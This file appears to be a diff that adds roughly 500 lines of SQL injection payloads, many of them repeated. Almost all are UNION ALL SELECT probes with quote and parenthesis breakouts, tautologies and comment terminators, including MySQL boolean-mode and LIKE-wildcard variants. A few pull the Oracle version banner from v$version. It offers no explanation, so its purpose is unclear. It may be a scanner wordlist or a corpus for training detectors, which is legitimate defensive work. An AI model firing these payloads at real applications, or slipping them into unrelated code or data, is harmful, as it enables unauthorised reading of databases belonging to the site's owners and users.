@@ -1,0 +1,500 @@
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1"  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'   )    )    union all select null,null,null,null,null,null#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--
+1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#
+-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'   )    )    union all select null,null,null,null,null,null--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-3725'   )    )    union all select 1541,1541,1541,1541,1541#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1%'   )    )    union all select null,null,null,null,null--
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null,null--
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+-4452%" union all select 7141,7141,7141,7141,7141,7141,7141,7141--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#
+1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-1164"  )   union all select 6617,6617,6617,6617,6617,6617--
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    union all select null,null,null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null,null--
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-7069  )   union all select 6638,6638,6638,6638,6638,6638--
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-1368   )    )    union all select 1310,1310,1310,1310,1310#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'   )    )    union all select null,null,null,null,null,null--
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-4452%" union all select 7141,7141,7141,7141,7141,7141,7141,7141--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-7069  )   union all select 6638,6638,6638,6638,6638,6638--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-1106'   )    )    union all select 2855,2855,2855,2855,2855,2855,2855#
+-6155%'   )    )    union all select 2421,2421,2421,2421,2421#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-4825%'  )   union all select 6804,6804,6804,6804,6804,6804,6804--
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--
+1'   )    )    union all select null,null,null,null,null,null--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-4452%" union all select 7141,7141,7141,7141,7141,7141,7141,7141--
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3725'   )    )    union all select 1541,1541,1541,1541,1541#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'  )   where 5799  =  5799 union all select null,null,null,null,null--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-4452%" union all select 7141,7141,7141,7141,7141,7141,7141,7141--
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-4452%" union all select 7141,7141,7141,7141,7141,7141,7141,7141--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-3725'   )    )    union all select 1541,1541,1541,1541,1541#
+-7858'  )   union all select 1541,1541,1541,1541,1541,1541#
+1'  )   where 8211  =  8211 union all select null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null,null--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+ select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1
+1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#
+1%'   )    )    union all select null,null,null,null,null--
+1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--
+-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--
+ select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--
+1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#
+-2287'   )    )    union all select 1200,1200,1200,1200,1200#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#
+-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-6580'  )   union all select 9950,9950,9950,9950,9950,9950--
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+-8215%"  )   union all select 3877,3877,3877,3877,3877,3877--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+-5317'   )    )    union all select 7673,7673,7673,7673,7673,7673#
+-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#
+1'   )    )    union all select null,null,null,null,null,null#
+-9408%"   )    )    union all select 1841,1841,1841,1841,1841,1841--
+1'   )    )    union all select null,null,null,null,null,null,null#
+1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#
+-2247'  )   union all select 1202,1202,1202,1202,1202#
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#
+1'   )    )    union all select null,null,null,null,null,null,null--
+1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--
+1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#
+1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#
+-3781%'  )   union all select 7497,7497,7497,7497,7497--
+1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#
